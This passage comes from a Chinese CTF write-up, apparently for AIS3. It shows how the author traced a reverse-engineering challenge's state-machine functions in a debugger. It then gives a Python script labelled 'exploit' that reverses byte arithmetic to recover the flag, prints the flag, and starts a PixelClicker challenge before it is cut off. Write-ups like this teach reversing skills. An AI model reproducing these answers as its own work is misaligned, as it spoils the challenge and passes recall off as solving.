\u003ccode\u003ek_target\u003c/code\u003e 複製出來\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/0f29e032-b311-41a9-844f-fea2b7f80b72\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/99d07b7c-a60d-4e3e-943a-8d80877ec0de\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003estate_machine\u003c/code\u003e 裡面會有一坨判斷並且會按照某個特定順序執行裡面的這些 function，設定中斷點做 debug 逐步執行，並且記錄這些 function 的執行過程\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/3e1242d3-c80f-4e09-85b1-760079fdc09e\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/85b6eea0-8d58-460a-804a-502a843ce8f1\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e得到：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003estate_3618225054\nstate_2057902921\nstate_671274660\nstate_2357240312\nstate_1438496410\nstate_2263885268\nstate_4260333374\nstate_3995931083\nstate_3844354947\nstate_2421543205\nstate_416430256\nstate_2373489361\nstate_2202680315\nstate_4026467378\nstate_1765279360\nstate_2131447726\nstate_1132589236\nstate_3443361864\nstate_2098792827\nstate_4237907356\nstate_269727185\nstate_1780152111\nstate_4046605750\nstate_3544494813\nstate_4008735947\nstate_2309210106\nstate_3908914479\nstate_2095151013\nstate_2816834243\nstate_4165665722\nstate_3656605789\nstate_1154341356\nstate_809393455\nstate_1093244921\nstate_1595228866\nstate_2316743832\nstate_2907124712\nstate_3507844042\nstate_3907553856\nstate_1929982570\nstate_4130555047\nstate_794507810\nstate_1843624184\nstate_3901233957\nstate_126130845\nstate_71198295\nstate_557589375\nstate_3420754995\nstate_3648003850\nstate_1978986903\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/4d3b76db-9a4d-478d-9864-adf0d9bd9449\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e這些 function 的內部都是一個加減法運算，所以我們按照這個順序反過來把 \u003ccode\u003ek_target\u003c/code\u003e 推回去就會拿到 flag 了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/404e0876-0838-4e42-aa21-6c555933b623\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"exploit-3\"\u003eexploit\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e bytearray(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\x9E\\x26\\xEC\\x33\\xE6\\x03\\xF4\\x3A\\x6B\\x62\\x85\\x75\\x5F\\xC4\\xD1\\x81\\x3B\\xEC\\xF8\\xB0\\xFA\\x34\\x4C\\xF2\\x58\\x72\\x5F\\x0D\\x54\\x34\\x7B\\x22\\xCD\\x33\\x53\\x53\\xC3\\xFA\\x54\\x80\\x33\\xCC\\x7D\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e [int(a) \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e a \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e data]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e37\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e20\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e14\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e17\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e38\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e24\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e15\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e40\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e37\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e12\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e12\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e18\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e26\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e31\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e23\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e30\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e39\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e27\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e25\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e37\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e27\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e18\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e41\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e34\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e13\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e26\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e34\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e25\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e28\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e31\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e25\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e18\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e29\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e15\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e21\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e13\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e42\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e21\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e34\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e15\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e13\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e25\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e28\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e32\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e25\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e31\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e40\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e30\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e13\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e15\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e21\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e24\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e20\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e36\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e11\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e15\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e33\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e19\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e29\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e13\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e30\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e33\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e15\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e20\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e19\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e24\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e27\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e18\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e20\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e39\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e25\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e38\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e23\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e34\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e37\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e29\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e40\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e17\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e9\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e11\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e31\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e34\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e25\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e11\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e14\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e32\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e41\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e11\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e18\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e31\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e9\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata[\u003cspan style=\"color:#ae81ff\"\u003e14\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e35\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e [(a \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e512\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e256\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e a \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e data]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint(data)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint(bytes(data))\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"flag-5\"\u003eFlag\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/211f3bd9-4c93-4797-a693-09fd643b71f4\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eAIS3{arE_Y0u_@_sTATEfuL_Or_ST4t3L3SS_CTF3R}\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id=\"pixelclicker\"\u003ePixelClicker\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/0728f691-eff5-4ab0-bf26-40d4f319bf19\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e(本題是賽後解的)\u003c/p\u003e\n\u003ch4 id=\"解題-5\"\u003e解題\u003c/h4\u003e\n\u003cp\u003e一個充滿了點點的正方形的 windows from，這接點點（pixel）可以點擊\u003c/p\u003e\n\u003cp\u003e\u003cimg 